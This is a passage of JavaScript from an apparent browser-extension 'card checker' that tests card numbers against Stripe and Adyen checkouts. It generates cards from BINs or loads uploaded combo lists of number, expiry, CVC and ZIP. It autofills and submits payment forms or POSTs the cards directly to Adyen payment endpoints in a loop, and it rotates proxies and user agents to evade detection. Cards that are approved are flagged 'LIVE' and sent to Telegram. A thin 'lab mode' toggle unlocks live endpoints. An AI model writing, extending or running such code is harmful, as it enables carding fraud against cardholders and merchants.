      let out = "URL:" + location.href + " | iframes:" + iframes.length + " " + JSON.stringify(iframes) +
        " | inputs:" + document.querySelectorAll("input").length;
      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "---" + t; });
      if (!s.texts.length) out += "\n(no frame handlers answered)";

      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px dashed #1a2430;color:#9be;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:250px;overflow:auto";
      line.textContent = out;
      box.prepend(line);
      logMsg("Debug dump ready. Read the top entry.");
    }

    el("#nono-min").addEventListener("click", minimize);
    el("#nono-dbg").addEventListener("click", debugDump);
    el("#nono-settings").addEventListener("click", () => {
      const adv = panel.querySelector("#nono-advanced");
      const open = adv.style.display === "none";
      adv.style.display = open ? "flex" : "none";
      chrome.storage.local.set({ nonoAdvOpen: open });
      logMsg(open ? "Settings open." : "Settings closed.");
    });
    el("#nono-copy-log").addEventListener("click", copyLog);
    chrome.storage.local.get("nonoAdvOpen", (res) => {
      const adv = panel.querySelector("#nono-advanced");
      if (res && res.nonoAdvOpen) adv.style.display = "flex";
    });
    el("#nono-close").addEventListener("click", () => {
      panel.style.opacity = "0";
      setTimeout(() => panel.remove(), 200);
    });

    function updateBinSpecLocal() {
      updateBinSpec();
      const lenSel = document.getElementById("nono-len");
      const binEl = document.getElementById("nono-bin");
      if (lenSel && binEl) {
        const b = (binEl.value || "").trim().replace(/[\s-]/g, "");
        if (/^[0-9]{2,}$/.test(b) && window.CardGen && window.CardGen.cardSpec) {
          const spec = window.CardGen.cardSpec(b);
          if (String(lenSel.value) === "0") lenSel.value = String(spec.length);
        }
      }
    }

    el("#nono-bin").addEventListener("input", () => {
      updateBinSpecLocal();
      savePanelState();
    });
    el("#nono-bin").addEventListener("focus", () => {
      if (cardSourceMode !== "bin") { applyCardMode("bin"); savePanelState(); logMsg("BIN mode — combo stopped, Chief."); }
    });
    el("#nono-len").addEventListener("change", () => { updateBinSpecLocal(); savePanelState(); });
    el("#nono-combo").addEventListener("input", () => {
      if (cardSourceMode !== "combo") { applyCardMode("combo"); savePanelState(); }
      savePanelState();
    });
    el("#nono-combo").addEventListener("focus", () => {
      if (cardSourceMode !== "combo") { applyCardMode("combo"); savePanelState(); logMsg("COMBO mode — BIN stopped, Chief."); }
    });
    el("#nono-holder").addEventListener("input", savePanelState);
    el("#nono-country").addEventListener("input", savePanelState);
    el("#nono-postal").addEventListener("input", savePanelState);
    el("#nono-email").addEventListener("input", savePanelState);
    el("#nono-mode-bin").addEventListener("click", () => {
      applyCardMode("bin");
      savePanelState();
      logMsg("BIN mode — combo stopped, Chief.");
    });
    el("#nono-mode-combo").addEventListener("click", () => {
      applyCardMode("combo");
      savePanelState();
      logMsg("COMBO mode — BIN stopped, Chief.");
    });
    el("#nono-stripe-url").addEventListener("input", savePanelState);
    el("#nono-autosubmit").addEventListener("change", savePanelState);
    el("#nono-autoonload").addEventListener("change", savePanelState);
    el("#nono-stripe-url").addEventListener("input", stripeAutoRun);
    el("#nono-autostripe").addEventListener("change", () => {
      savePanelState();
      stripeSet(el("#nono-autostripe").checked ? "auto armed" : "manual", el("#nono-autostripe").checked ? "#635bff" : "#8fa3b5");
      if (el("#nono-autostripe").checked) stripeAutoScan(true);
    });

    el("#nono-start").addEventListener("click", startHit);
    el("#nono-stop").addEventListener("click", () => {
      stopRequested = true;
      detachCapture();
      logMsg("Stopped by Chief.");
    });

    el("#nono-upload-btn").addEventListener("click", () => {
      el("#nono-file-input").click();
    });

    el("#nono-file-input").addEventListener("change", (e) => {
      const file = e.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = (event) => {
        const content = event.target.result;
        const lines = content.split(/\r?\n/).filter(line => line.trim());

        importedCombos = lines.map(line => {
          const parts = line.split("|").map(s => s.trim());
          return {
            number: (parts[0] || "").replace(/\s/g, ""),
            month: parts[1] || "",
            year: parts[2] || "",
            cvc: parts[3] || "",
            zip: parts[4] || ""
          };
        }).filter(c => c.number && c.month && c.year && c.cvc);

        currentComboIndex = 0;
        saveCombos();
        updateComboList();
        el("#nono-combo-count").textContent = importedCombos.length + " combos";

        if (cardSourceMode !== "combo") {
          applyCardMode("combo");
          savePanelState();
        }

        if (importedCombos.length > 0) {
          logMsg("Loaded " + importedCombos.length + " combos");
        } else {
          logMsg("No valid combos found");
        }
      };
      reader.readAsText(file);
      e.target.value = '';
    });

    el("#nono-clear-combos").addEventListener("click", () => {
      importedCombos = [];
      currentComboIndex = 0;
      saveCombos();
      updateComboList();
      el("#nono-combo-count").textContent = "0 combos";
      logMsg("Combos cleared");
    });

    const proxyEl = (id) => panel.querySelector(id);
    if (proxyEl("#nono-proxy-next")) {
      proxyEl("#nono-proxy-next").addEventListener("click", async () => {
        const r = await proxyMsg({ action: "PROXY_ROTATE" });
        logMsg(r && r.proxy ? "Proxy -> " + r.proxy.label : "Proxy rotate failed.");
        refreshProxyStatus();
      });
      proxyEl("#nono-proxy-test").addEventListener("click", async () => {
        logMsg("Testing proxy...");
        const r = await proxyMsg({ action: "PROXY_TEST", index: 0 });
        logMsg(r && r.ok ? "Proxy OK " + r.ip + " (" + r.ms + "ms)" : "Proxy FAIL " + (r && r.error ? r.error : ""));
        refreshProxyStatus();
      });
      proxyEl("#nono-proxy-off").addEventListener("click", async () => {
        await proxyMsg({ action: "PROXY_OFF" });
        logMsg("Proxy off. System restored.");
        refreshProxyStatus();
      });
      refreshProxyStatus();
    }

    if (proxyEl("#nono-ua-next")) {
      let uaOn = false;
      proxyEl("#nono-ua-next").addEventListener("click", async () => {
        const r = await proxyMsg({ action: "UA_NEXT" });
        logMsg(r && r.ok ? "UA -> " + r.label : "UA rotate failed: " + (r && r.error));
        proxyEl("#nono-ua-label").textContent = "UA: " + (r && r.ok ? r.label : "OFF");
        uaOn = true;
        proxyEl("#nono-ua-toggle").style.background = "#22303a";
      });
      proxyEl("#nono-ua-toggle").addEventListener("click", async () => {
        uaOn = !uaOn;
        await proxyMsg({ action: "UA_SET_STATE", enabled: uaOn, index: 0 });
        proxyEl("#nono-ua-label").textContent = uaOn ? "UA: rotation ON" : "UA: OFF";
        proxyEl("#nono-ua-toggle").style.background = uaOn ? "#22303a" : "#3a3022";
        logMsg(uaOn ? "UA rotation enabled." : "UA rotation disabled.");
      });
    }

    const csStatus = proxyEl("#nono-cs-status");
    let csRunning = false;
    function csSet(status, color) {
      if (csStatus) {
        csStatus.textContent = status;
        csStatus.style.color = color || "#8fa3b5";
      }
    }

    async function runCheckshopperPay(sess, lab) {
      if (csRunning) {
        logMsg("Already paying this session — STOP first to relaunch.");
        return;
      }
      csRunning = true;
      try {
        await runCheckshopperPayInner(sess, lab);
      } finally {
        csRunning = false;
      }
    }

    async function runCheckshopperPayInner(sess, lab) {
      const gate = gateSessionUrl(sess.payUrl || sess.rawUrl || "", lab);
      if (!gate.ok) {
        csSet("REFUSED — " + gate.reason, "#ff5d5d");
        logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, or use a sandbox URL, Chief.");
        return;
      }
      if (lab && /live|clientKey=live_/i.test(sess.payUrl || "")) {
        logMsg("Lab mode ON — hitting live-looking endpoint. Double-check it's your sim, Chief.");
      }
      if (!sess.payUrl) {
        csSet("no payments endpoint", "#ffd166");
        logMsg("Paste a checkoutshopper URL — no endpoint found in what you gave me.");
        return;
      }

      const cfg = await getConfig();
      const hasCard = hasCardSource(cfg);
      if (!hasCard) {
        logMsg("Give me a BIN, combo, or combo file first, Chief.");
        return;
      }

      const contP = !!(cfg && cfg.continuous !== false);

      stopRequested = false;
      tries = 0;
      liveHits = 0;
      updateCount();
      box.innerHTML = "";
      csSet("ARMed ✓ " + (sess.sessionId ? sess.sessionId.slice(0, 12) : "session"), "#00d1b2");
      logMsg("Checkoutshopper armed — pay loop starting...");
      await attachCapture();

      let sessionData = sess.sessionData;
      if (!sessionData && sess.sessionId) {
        const gs = await proxyMsg({ action: "GET_SESSION", sessionId: sess.sessionId, url: sess.payUrl });
        if (gs && gs.sessionData) {
          sessionData = gs.sessionData;
          logMsg("sessionData auto-loaded from captured request.");
        }
      }
      const browserInfo = sess.browserInfo || defaultBrowserInfo();

      while (!stopRequested) {
        const hitStart = Date.now();

        const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
        if (pr && pr.proxy) logMsg("Proxy: " + pr.proxy.label);

        const ua = await proxyMsg({ action: "UA_NEXT" });
        if (ua && ua.label) logMsg("UA: " + ua.label);

        let card;
        const imode = resolveMode(cfg);
        if (imode === "combo" && importedCombos.length > 0) {
          const combo = importedCombos[currentComboIndex];
          card = { number: combo.number, month: combo.month, year: combo.year, cvc: combo.cvc, zip: combo.zip || "", holder: (cfg && cfg.holder) || "JOHN DOE", country: (cfg && cfg.country) || "" };
          currentComboIndex = (currentComboIndex + 1) % importedCombos.length;
          saveCombos();
        } else if (imode === "combo" && cfg && cfg.combo) {
          const p = parseCombo(cfg.combo);
          card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, zip: p.zip || "", holder: cfg.holder || "JOHN DOE", country: cfg.country || "" };
        } else if (imode === "bin" && window.CardGen && cfg && cfg.bin) {
          card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 0 });
          card.holder = cfg.holder || "JOHN DOE";
          card.month = card.expiryMonth;
          card.year = card.expiryYear;
          card.zip = (cfg && cfg.postal) ? cfg.postal : "";
          card.country = (cfg && cfg.country) || "";
        } else {
          logMsg("No usable card source — BIN or combo required.");
          return;
        }
        pendingCard = card;

        tries++;
        updateCount();
        logMsg("Try #" + tries + " -> " + card.number);

        const payload = {
          sessionData: sessionData || "",
          browserInfo: browserInfo,
          paymentMethod: {
            type: "scheme",
            number: card.number,
            expiryMonth: String(card.month || "12").padStart(2, "0"),
            expiryYear: "20" + String(card.year || "29").slice(-2),
            cvc: card.cvc || "",
            holderName: card.holder || "JOHN DOE"
          }
        };

        let bodyText = "";
        let status = 0;
        let err = "";
        try {
          const r = await fetch(sess.payUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "*/*",
              "Origin": location.origin,
              "Referer": location.href
            },
            body: JSON.stringify(payload)
          });
          status = r.status;
          bodyText = await r.text();
        } catch (e) {
          err = String((e && e.message) || e);
        }

        if (err) {
          logResult("&#9888;", "try#" + tries + " fetch failed: " + err.slice(0, 100), "#ffd166");
          if (/Mixed Content/i.test(err)) logMsg("Mixed-content — open the sandbox/sim page (http) and paste here.");
          await sleep(1200);
          continue;
        }

        capturedResps.push({ at: Date.now(), url: sess.payUrl, status: status, body: bodyText });
        if (capturedResps.length > 60) capturedResps.shift();

        const info = parseAdyenResp(bodyText);
        let res = info
          ? {
              ok: /authorised|pending|challenge|redirect|threeds|await|otp/i.test(info.resultCode || ""),
              label: "API " + (info.resultCode || info.action || "?") +
                (info.refusalReason ? " | " + info.refusalReason : "")
            }
          : { ok: false, label: "NO ADYEN VERDICT (HTTP " + status + ")" };

        if (info) {
          window.__nonoResult && window.__nonoResult("&#128269;",
            "RESP " + (info.resultCode || info.action || "?") +
            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
          pushLog("RESP adyen " + status + " " + String((info.resultCode || info.action) + (info.refusalReason ? " " + info.refusalReason : "")).trim());
        }

        pushLog("CARD " + card.number + " " + (card.month || "??") + "/" + (card.year || "????") + " cvc " + (card.cvc || "?") + (card.zip ? " zip " + card.zip : "") + " -> " + res.label + (res.ok ? " [LIVE]" : ""));

        if (res.ok) {
          liveHits++;
          updateCount();
          window.__nonoResult && window.__nonoResult("&#11088;",
            "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
            " " + card.cvc + " -> " + res.label, "#00d1b2");
          logMsg(contP ? ("LIVE hit #" + liveHits + " — keep scanning.") : ("LIVE HIT! " + res.label + ". Stopping."));
          if (!contP) stopRequested = true;

          const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
          const uaLabel = ua && ua.label ? ua.label : "";
          const hitText = [
            "<b>⚡ HIT #" + liveHits + "</b>",
            "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
            "Verdict: <b>" + res.label + "</b>",
            "Session: " + (sess.sessionId || "?") + " | " + sess.payUrl.split("//")[1].split("/")[0],
            prLabel ? "Proxy: " + prLabel : "",
            uaLabel ? "UA: " + uaLabel : ""
          ].filter(Boolean).join("\n");
          proxyMsg({ action: "TG_HIT", text: hitText }).then((tg) => {
            if (!tg) return;
            if (tg.gated) {
              window.__nonoLog && window.__nonoLog("Telegram blocked: " + (tg.reason || "gated"));
            } else if (!tg.ok) {
              window.__nonoLog && window.__nonoLog("Telegram error: " + (tg.error || "?"));
            }
          });
        } else {
          window.__nonoResult && window.__nonoResult("&#10060;",
            "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
            " " + card.cvc + " -> " + res.label, "#ff5d5d");
          if (!contP && tries >= 30) {
            logMsg("30 tries. Stopping.");
            stopRequested = true;
          }
          await sleep(1200);
        }
      }

      csSet("done — " + liveHits + " hit(s)", liveHits ? "#00d1b2" : "#8fa3b5");
      logMsg("Pay loop stopped.");
    }

    const inbuiltStatus = proxyEl("#nono-inbuilt-status");
    let lastInbuiltKey = "";
    let inbuiltAutoActive = false;
    function inbuiltSet(status, color) {
      if (inbuiltStatus) {
        inbuiltStatus.textContent = status;
        inbuiltStatus.style.color = color || "#8fa3b5";
      }
    }

    function inbuiltSessionKey(sess) {
      return (sess.sessionId || "") + "|" + (sess.clientKey || "") + "|" + String(sess.sessionData || "").slice(-12);
    }

    async function runInbuiltSession(sess, lab, force) {
      if (!sess || !sess.sessionData || !sess.payUrl) {
        inbuiltSet(force ? "no embedded session found" : "", force ? "#ffd166" : "#8fa3b5");
        return;
      }
      const g = gateSessionUrl(sess.payUrl, lab);
      if (!g.ok) {
        inbuiltSet("REFUSED — " + g.reason, "#ff5d5d");
        logMsg("Inbuilt session refused (live Adyen). Lab mode unlocks sims, Chief.");
        return;
      }
      sess.rawUrl = sess.payUrl;
      const key = inbuiltSessionKey(sess);
      if (!force && key === lastInbuiltKey) return;
      lastInbuiltKey = key;
      if (csUrlEl) csUrlEl.value = sess.payUrl;
      inbuiltSet("session " + (sess.sessionId || "?").slice(0, 10) + " armed — paying…", "#00d1b2");
      logMsg("Inbuilt session extracted — direct pay loop starting.");
      runCheckshopperPay(sess, lab);
    }

    async function inbuiltAutoScan(force) {
      if (!panelActive()) return;
      if (csRunning || running) return;
      const cfg = await getConfig();
      if (!force && !(cfg && cfg.autoInbuilt)) return;
      if (!hasCardSource(cfg)) {
        if (force) inbuiltSet("need BIN/combo", "#ffd166");
        return;
      }
      const lab = await getLab();
      const sess = await extractInbuiltSession();
      runInbuiltSession(sess, lab, force);
    }

    if (proxyEl("#nono-inbuilt-pay")) {
      proxyEl("#nono-inbuilt-pay").addEventListener("click", async () => {
        await attachCapture();
        injectHook();
        await inbuiltAutoScan(true);
      });
    }
    if (proxyEl("#nono-inbuilt-clear")) {
      proxyEl("#nono-inbuilt-clear").addEventListener("click", async () => {
        lastInbuiltKey = "";
        if (csUrlEl) csUrlEl.value = "";
        capturedResps = [];
        await proxyMsg({ action: "CLEAR_CAPTURED" });
        inbuiltSet("capture cleared", "#8fa3b5");
        logMsg("Inbuilt capture cleared.");
      });
    }
    if (proxyEl("#nono-autoinbuilt")) {
      proxyEl("#nono-autoinbuilt").addEventListener("change", () => {
        savePanelState();
        inbuiltAutoActive = proxyEl("#nono-autoinbuilt").checked;
        inbuiltSet(inbuiltAutoActive ? "auto-scan armed" : "manual only", inbuiltAutoActive ? "#9b59b6" : "#8fa3b5");
        if (inbuiltAutoActive) inbuiltAutoScan(true);
      });
    }

    window.__nonoInbuiltScan = () => inbuiltAutoScan(true);
    setInterval(() => { inbuiltAutoScan(false); }, 3000);
    getConfig().then((cfg) => {
      if (cfg && cfg.autoInbuilt) {
        inbuiltAutoActive = true;
        inbuiltSet("auto-scan armed", "#9b59b6");
        setTimeout(() => inbuiltAutoScan(true), 600);
      }
    });

    const stripeStatus = proxyEl("#nono-stripe-status");
    function stripeSet(status, color) {
      if (stripeStatus) {
        stripeStatus.textContent = status;
        stripeStatus.style.color = color || "#8fa3b5";
      }
    }

    async function stripeAutoScan(force) {
      if (!panelActive()) return;
      if (running || csRunning) return;
      const cfg = await getConfig();
      if (!force && !(cfg && cfg.autoStripe)) return;
      if (!hasCardSource(cfg)) return;
      if (!stripeUISignal()) {
        stripeSet(force ? "no stripe ui here" : "", force ? "#ffd166" : "#8fa3b5");
        return;
      }
      stripeSet("stripe armed — hitting…", "#635bff");
      logMsg("Stripe detected — auto hit starting, Chief.");
      savePanelState();
      injectHook();
      attachCapture();
      startHit();
    }

    function stripeAutoRun() {
      clearTimeout(window.__nonoStripeOpenTimer);
      window.__nonoStripeOpenTimer = setTimeout(async () => {
        const cfg = await getConfig();
        if (cfg && cfg.stripeUrl && /(buy|checkout|pay)\.stripe\.[a-z]+/.test(cfg.stripeUrl)) {
          stripeSet("opening link…", "#635bff");
          chrome.storage.local.set({ nonoStripePending: true });
          proxyMsg({ action: "STRIPE_OPEN", url: cfg.stripeUrl }).then(() => {
            stripeSet("link opened — hit runs there", "#00d1b2");
          });
        }
      }, 700);
    }

    if (proxyEl("#nono-stripe-open")) {
      proxyEl("#nono-stripe-open").addEventListener("click", () => {
        const cfg = savePanelState();
        if (!cfg.stripeUrl || !/(buy|checkout|pay)\.stripe\./.test(cfg.stripeUrl)) {
          stripeSet("paste a payment link first", "#ffd166");
          logMsg("Paste a Stripe payment link (buy.stripe.com / checkout.stripe.com), Chief.");
          return;
        }
        stripeSet("opening link…", "#635bff");
        chrome.storage.local.set({ nonoStripePending: true });
        proxyMsg({ action: "STRIPE_OPEN", url: cfg.stripeUrl }).then((r) => {
          stripeSet(r && r.ok ? "link opened — hit runs there" : "open failed", r && r.ok ? "#00d1b2" : "#ff5d5d");
        });
      });
    }

    setInterval(() => { stripeAutoScan(false); }, 3000);
    getConfig().then((cfg) => {
      if (cfg && cfg.autoStripe) {
        stripeSet("auto armed", "#635bff");
        setTimeout(() => stripeAutoScan(true), 800);
      }
    });

    if (proxyEl("#nono-cs-pay")) {
      proxyEl("#nono-cs-pay").addEventListener("click", async () => {
        const txt = proxyEl("#nono-cs-url").value;
        const lab = await getLab();
        const rawList = (txt.match(/https?:\/\/[^\s'"\)]+/g) || []);
        const warned = gateSessionUrl(txt, lab);
        if (!warned.ok) {
          csSet("REFUSED — " + warned.reason, "#ff5d5d");
          logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, Chief.");
          return;
        }
        for (const ru of rawList) {
          const gg = gateSessionUrl(ru, lab);
          if (!gg.ok) {
            csSet("REFUSED — " + gg.reason, "#ff5d5d");
            logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, Chief.");
            return;
          }
        }
        const sess = parseCheckshopper(txt);
        if (!sess) {
          csSet("couldn't parse", "#ffd166");
          logMsg("Couldn't parse that — paste a checkoutshopper URL or the full curl, Chief.");
          return;
        }
        sess.rawUrl = txt;
        if (lab) {
          csSet("LAB — allowed", "#ffd166");
          logMsg("Lab mode ON — live-looking URL allowed for your sim.");
        }
        logMsg("Session parsed: " + (sess.sessionId || sess.payUrl || "?"));
        runCheckshopperPay(sess, lab);
      });
    }

    let csAutoTimer = null;
    const csUrlEl = proxyEl("#nono-cs-url");
    function csAutoRun() {
      if (csRunning) return;
      clearTimeout(csAutoTimer);
      csAutoTimer = setTimeout(async () => {
        const txt = (csUrlEl.value || "").trim();
        if (!txt) return;
        const lab = await getLab();
        if (!gateSessionUrl(txt, lab).ok) return;
        const sess = parseCheckshopper(txt);
        if (!sess || !sess.payUrl) return;
        const cfg = await getConfig();
        if (!hasCardSource(cfg)) {
          csSet("need BIN/combo/file", "#ffd166");
          logMsg("Auto-pay armed — add a BIN, combo, or combo file above and it pays by itself.");
          return;
        }
        sess.rawUrl = txt;
        csSet("auto-pay running…", "#00d1b2");
        logMsg("Session detected — paying automatically, Chief.");
        runCheckshopperPay(sess, lab);
      }, 700);
    }
    if (csUrlEl) {
      csUrlEl.addEventListener("input", csAutoRun);
      csUrlEl.addEventListener("paste", () => setTimeout(csAutoRun, 60));
    }

    function startHit() {
      if (running) {
        logMsg("Already running — hit STOP first.");
        return;
      }
      const bin = el("#nono-bin").value.trim();
      const combo = el("#nono-combo").value.trim();
      const mode = resolveMode({ bin: bin, combo: combo, mode: cardSourceMode });
      if (mode === "combo" && !combo && importedCombos.length === 0) {
        logMsg("COMBO mode — give me a combo or combo file first, Chief.");
        return;
      }
      if (mode === "bin" && !bin) {
        logMsg("BIN mode — give me a BIN first, Chief.");
        return;
      }
        savePanelState();
      injectHook();
      attachCapture();
      stopRequested = false;
      tries = 0;
      liveHits = 0;
      updateCount();
      box.innerHTML = "";
      logMsg("Hitting...");
      runHits();
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
    window.__nonoRestore = restore;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "", zip: parts[4] || "" };
  }

  async function fillRound(card) {
    let got = { any: false, fields: {} };
    try {
      const res = await execFill(card);
      if (res && !res.error && res.any) got = { any: true, fields: res.fields || {} };
    } catch (e) {}
    const tick = Date.now() + Math.floor(Math.random() * 1000);
    currentTick = tick;
    clearReports("nono_ff");
    chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
    const st = await waitReports("nono_ff", 1500, 6000);
    return { exec: got, storage: st, any: got.any || st.any };
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    const continuous = cfg.continuous !== false;
    running = true;
    injectHook();
    window.__nonoLog && window.__nonoLog("Running...");

    while (!stopRequested && running) {
      const hitStart = Date.now();

      const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
      if (pr && pr.proxy) {
        window.__nonoLog && window.__nonoLog("Proxy: " + pr.proxy.label);
      }

      const ua = await proxyMsg({ action: "UA_NEXT" });
      if (ua && ua.label) {
        window.__nonoLog && window.__nonoLog("UA: " + ua.label);
      }

      let card;
      const mode = resolveMode(cfg);
      if (mode === "combo") {
        if (importedCombos.length > 0) {
          const combo = importedCombos[currentComboIndex];
          card = { number: combo.number, month: combo.month, year: combo.year, cvc: combo.cvc, zip: combo.zip || "", holder: cfg.holder || "JOHN DOE", country: cfg.country || "" };
          currentComboIndex = (currentComboIndex + 1) % importedCombos.length;
          saveCombos();
        } else if (cfg.combo) {
          const p = parseCombo(cfg.combo);
          card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, zip: p.zip || "", holder: cfg.holder || "JOHN DOE", country: cfg.country || "" };
          card.email = cfg.email || randomEmail();
        } else {
          stopRequested = true;
          window.__nonoLog && window.__nonoLog("COMBO mode — give me a combo or combo file, Chief.");
          break;
        }
      } else {
        if (!cfg.bin) {
          stopRequested = true;
          window.__nonoLog && window.__nonoLog("BIN mode — give me a BIN first, Chief.");
          break;
        }
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 0 });
        card.holder = cfg.holder || "JOHN DOE";
        card.month = card.expiryMonth;
        card.year = card.expiryYear;
        card.zip = cfg.postal || "";
        card.country = cfg.country || "";
        card.email = cfg.email || randomEmail();
      }
      pendingCard = card;

      tries++;
      window.__nonoUpdate && window.__nonoUpdate();
      window.__nonoLog && window.__nonoLog("Try #" + tries + " -> " + card.number);

      let st = { any: false };
      for (let round = 0; round < 3 && !stopRequested; round++) {
        ensureCardMethod();
        await sleep(500);
        st = await fillRound(card);
        if (st.any) break;
        window.__nonoLog && window.__nonoLog("No fields yet, round " + (round + 1) + "/3...");
        await sleep(2200);
      }

      let submitted = false;
      if (cfg.autoSubmit !== false && st.any) {
        submitted = await tryPayHard(card);
        if (!submitted) {
          window.__nonoLog && window.__nonoLog("Pay still dead, re-fill + hard pay round 2...");
          st = await fillRound(card);
          await sleep(900);
          submitted = await tryPayHard(card);
        }
        await sleep(1800);
      }

      let resp = lastRespSince(hitStart);
      let respInfo = null;
      let respProvider = "";
      if (st.any && submitted) {
        const deadline = Date.now() + 6000;
        while (Date.now() < deadline && !stopRequested) {
          const r = lastRespSince(hitStart);
          if (r) {
            const sp = parseStripeResp(r.body);
            if (sp) { resp = r; respInfo = sp; respProvider = "stripe"; break; }
            const ap = parseAdyenResp(r.body);
            if (ap) { resp = r; respInfo = ap; respProvider = "adyen"; break; }
          }
          await sleep(400);
        }
      }
      if (!respInfo) await settleResultText(3000);
      resp = resp || lastRespSince(hitStart);

      const dtTick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = dtTick;
      clearReports("nono_dt");
      chrome.storage.local.set({ nono_detect: { tick: dtTick } });
      const dt = await waitReports("nono_dt", 800, 4000);

      let res = detectResult(dt.texts);
      if (respInfo && respProvider === "stripe") {
        const v = stripeVerdict(respInfo);
        if (v) res = v;
      } else if (respInfo) {
        const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
        res = {
          ok: /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code),
          label: "API " + (respInfo.resultCode || respInfo.action || "?") +
            (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
        };
      }
      if (!res) {
        if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
        else if (!submitted) res = { ok: false, label: "PAY BUTTON MISSED" };
        else res = { ok: false, label: "NO VISIBLE RESULT" };
      }

      pushLog("CARD " + card.number + " " + (card.month || "??") + "/" + (card.year || "????") + " cvc " + (card.cvc || "?") + (card.zip ? " zip " + card.zip : "") + " -> " + res.label + (res.ok ? " [LIVE]" : ""));
      if (resp && resp.body) {
        const body = String(resp.body);
        if (body.length > 4) pushLog("RESP " + (respProvider || "?") + " " + (resp.status || "") + " " + body.slice(0, 800));
      }

      window.__nonoUpdate && window.__nonoUpdate();

      const respTail = respInfo
        ? " | " + (respProvider === "stripe"
          ? (respInfo.decline || respInfo.code || respInfo.status || respInfo.message || respInfo.action || "")
          : (respInfo.resultCode || respInfo.action || "")
          + (respInfo.refusalReason ? " " + respInfo.refusalReason : ""))
        : "";

      if (res.ok) {
        liveHits++;
        window.__nonoUpdate && window.__nonoUpdate();
        window.__nonoResult && window.__nonoResult("&#11088;",
          "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label, "#00d1b2");
        window.__nonoLog && window.__nonoLog(continuous ? ("LIVE hit #" + liveHits + " — keep scanning.") : ("LIVE HIT! " + res.label + ". Stopping."));
        if (!continuous) stopRequested = true;

        const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
        const uaLabel = ua && ua.label ? ua.label : "";
        const hitText = [
          "<b>⚡ HIT #" + liveHits + "</b>",
          "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
          "Verdict: <b>" + res.label + "</b>" + respTail,
          prLabel ? "Proxy: " + prLabel : "",
          uaLabel ? "UA: " + uaLabel : ""
        ].filter(Boolean).join("\n");
        proxyMsg({ action: "TG_HIT", text: hitText }).then((tg) => {
          if (!tg) return;
          if (tg.gated) {
            window.__nonoLog && window.__nonoLog("Telegram blocked: " + (tg.reason || "gated"));
          } else if (!tg.ok) {
            window.__nonoLog && window.__nonoLog("Telegram error: " + (tg.error || "?"));
          }
        });
      } else {
        window.__nonoResult && window.__nonoResult("&#10060;",
          "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label + respTail, "#ff5d5d");
        if (!continuous && tries >= 30) {
          window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
          stopRequested = true;
        }
      }

      await sleep(cfg.autoSubmit ? 2000 : 800);
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  function reevaluate() {
    getLab().then((lab) => {
      if (!isTop) return;
      removeBlockedNotice();
      if (hostAllowed(location.href, lab)) {
        hostOk = true;
        if (!document.getElementById("nono-panel")) init();
      } else {
        hostOk = false;
        buildBlockedNotice();
      }
    });
  }

  async function init() {
    if (!isTop) return;
    if (!paymentRelevant()) return;
    const lab = await getLab();
    if (!hostAllowed(location.href, lab)) {
      hostOk = false;
      removeBlockedNotice();
      buildBlockedNotice();
      return;
    }
    hostOk = true;
    removeBlockedNotice();
    await loadCombos();
    buildPanel();
    updateComboList();
    const comboCountEl = document.getElementById("nono-combo-count");
    if (comboCountEl) comboCountEl.textContent = importedCombos.length + " combos";
    const cfg = await getConfig();
    if (cfg) {
      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-email", "nono-country", "nono-postal", "nono-stripe-url", "nono-len", "nono-autosubmit", "nono-autoonload", "nono-continuous"];
      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.country || "", cfg.postal || "", cfg.stripeUrl || "", String(cfg.cardLength || 0), cfg.autoSubmit == null ? true : !!cfg.autoSubmit, !!cfg.autoOnLoad, cfg.continuous === false ? false : true];
      ids.forEach((id, i) => {
        const e = document.getElementById(id);
        if (e) {
          if (e.type === "checkbox") e.checked = vals[i];
          else e.value = vals[i];
        }
      });
      applyCardMode(resolveMode(cfg));
      if (document.getElementById("nono-bin-spec")) updateBinSpec();
      const ib = document.getElementById("nono-autoinbuilt");
      if (ib) ib.checked = !!cfg.autoInbuilt;
      const ist = document.getElementById("nono-autostripe");
      if (ist) ist.checked = !!cfg.autoStripe;
